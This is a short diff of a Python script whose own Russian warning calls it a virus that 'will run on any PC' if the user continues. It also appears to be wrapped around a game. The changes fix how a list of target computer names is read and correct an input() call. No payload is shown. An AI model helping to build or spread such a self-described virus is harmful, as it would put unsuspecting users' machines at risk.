@@ -16,14 +16,16 @@ try:
 except ImportError:
     keyboard = None
 try:
+    TARGET_HOSTS = []
     with open("Save_PC_name.txt", 'r', encoding="utf-8") as f:
-        TARGET_HOSTS = f.readlines()
+        for host in f:
+            TARGET_HOSTS.append(host.strip())
         print(TARGET_HOSTS)
 except:
     print("Ошибка при чтении файла Save_PC_name.txt")
     print("[!] Внимание если продолжите вирус запуститься на любом пк")
     while True:
-        agreed = input(object = "Хотите продолжить? y/n")
+        agreed = input("Хотите продолжить? y/n ")
         if agreed == "y":
             print("Продолжаем")
             break
@@ -1029,7 +1031,6 @@ def main():
                 sys.exit(0)
 
     run_game()
-
 
 if __name__ == "__main__":
     main()
